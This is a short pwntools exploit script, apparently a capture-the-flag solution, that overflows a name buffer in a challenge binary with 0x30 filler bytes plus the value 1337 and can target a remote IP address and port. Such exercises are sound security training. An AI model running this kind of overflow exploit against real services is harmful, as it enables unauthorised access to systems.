#!/usr/bin/env python3

from pwn import *

PATH = 'app/chall'
#PATH = 'chall'

HOST = 'localhost'
HOST = '103.167.136.89'
PORT = 10020

GDBSCRIPT = '''
set resolve-heap-via-heuristic on
'''

def debug(r):
    if type(r) == process:
        gdb.attach(r, GDBSCRIPT)

def exploit(r):
    r.sendlineafter(b'Name: ', b'A' * 0x30 + p32(1337))
    # debug(r)
    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH, checksec=True)
    # libc = elf.libc
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = elf.process(aslr=False, env={})
    exploit(r)
